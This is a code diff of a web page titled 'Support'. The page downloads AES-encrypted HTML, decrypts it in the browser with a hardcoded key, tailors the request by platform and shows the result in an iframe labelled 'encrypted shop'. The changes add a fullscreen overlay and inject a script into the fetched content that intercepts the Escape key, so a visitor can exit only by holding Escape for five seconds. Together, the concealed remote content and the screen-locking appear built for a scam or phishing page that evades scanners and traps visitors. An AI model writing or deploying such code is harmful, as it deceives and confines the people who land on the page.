@@ -6,24 +6,91 @@
   <title>Support</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
   <style>
-    html, body { margin: 0; height: 100%; overflow: hidden; background: #fff; }
-    #frame { width: 100%; height: 100vh; border: 0; display: block; }
+    html, body { 
+      margin: 0; 
+      padding: 0; 
+      height: 100%; 
+      overflow: hidden; 
+      background: #fff; 
+    }
+
+    /* Fullscreen CSS Overlay */
+    #iframe-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 999999;
+      background: #fff;
+    }
+
+    #frame { 
+      width: 100%; 
+      height: 100%; 
+      border: 0; 
+      display: block; 
+    }
+
+    /* 5-Second Hold Progress Notice */
+    #esc-notice {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.85);
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      display: none;
+      z-index: 1000000;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    .progress-bar-bg {
+      width: 100%;
+      height: 4px;
+      background: #555;
+      margin-top: 8px;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      width: 0%;
+      height: 100%;
+      background: #ff4757;
+      transition: width 5s linear;
+    }
   </style>
 
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
-</script>
-
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
 </head>
 <body>
 
-  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+  <!-- Fullscreen Fixed Overlay -->
+  <div id="iframe-overlay">
+    <iframe id="frame" title="encrypted shop"></iframe>
+  </div>
+
+  <!-- Hold ESC Notification -->
+  <div id="esc-notice">
+    Hold <b>ESC</b> for 5 seconds to exit
+    <div class="progress-bar-bg">
+      <div id="progress-fill" class="progress-bar-fill"></div>
+    </div>
+  </div>
 
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
@@ -44,9 +111,32 @@
       try {
         const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
         const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        let html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
         
         if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        // Inject ESC key tracking code inside iframe before rendering
+        const iframeScript = `
+          <script>
+            window.addEventListener('keydown', function(e) {
+              if (e.key === 'Escape') {
+                e.preventDefault();
+                window.parent.postMessage({ type: 'ESC_KEYDOWN' }, '*');
+              }
+            });
+            window.addEventListener('keyup', function(e) {
+              if (e.key === 'Escape') {
+                window.parent.postMessage({ type: 'ESC_KEYUP' }, '*');
+              }
+            });
+          <\/script>
+        `;
+
+        if (html.includes("</body>")) {
+          html = html.replace("</body>", iframeScript + "</body>");
+        } else {
+          html += iframeScript;
+        }
 
         if (lastUrl) URL.revokeObjectURL(lastUrl);
         const blob = new Blob([html], { type: "text/html" });
@@ -59,8 +149,65 @@
       }
     }
 
-    
     window.addEventListener("DOMContentLoaded", loadSecret);
+
+    // --- 5 Second ESC Hold Logic ---
+    let escTimer = null;
+    let isHolding = false;
+    const HOLD_TIME = 5000;
+
+    const notice = document.getElementById("esc-notice");
+    const progressFill = document.getElementById("progress-fill");
+    const overlay = document.getElementById("iframe-overlay");
+
+    function startEscHold() {
+      if (!isHolding) {
+        isHolding = true;
+        notice.style.display = "block";
+        setTimeout(() => {
+          progressFill.style.width = "100%";
+        }, 10);
+
+        escTimer = setTimeout(() => {
+          if (overlay) overlay.style.display = "none";
+          notice.style.display = "none";
+        }, HOLD_TIME);
+      }
+    }
+
+    function stopEscHold() {
+      isHolding = false;
+      clearTimeout(escTimer);
+      notice.style.display = "none";
+      progressFill.style.transition = "none";
+      progressFill.style.width = "0%";
+      setTimeout(() => {
+        progressFill.style.transition = "width 5s linear";
+      }, 50);
+    }
+
+    // Parent Window Listeners
+    window.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") {
+        e.preventDefault();
+        startEscHold();
+      }
+    });
+
+    window.addEventListener("keyup", (e) => {
+      if (e.key === "Escape") {
+        stopEscHold();
+      }
+    });
+
+    // Iframe Message Listener (captures Escape inside iframe)
+    window.addEventListener("message", (event) => {
+      if (event.data && event.data.type === 'ESC_KEYDOWN') {
+        startEscHold();
+      } else if (event.data && event.data.type === 'ESC_KEYUP') {
+        stopEscHold();
+      }
+    });
   </script>
 </body>
 </html>
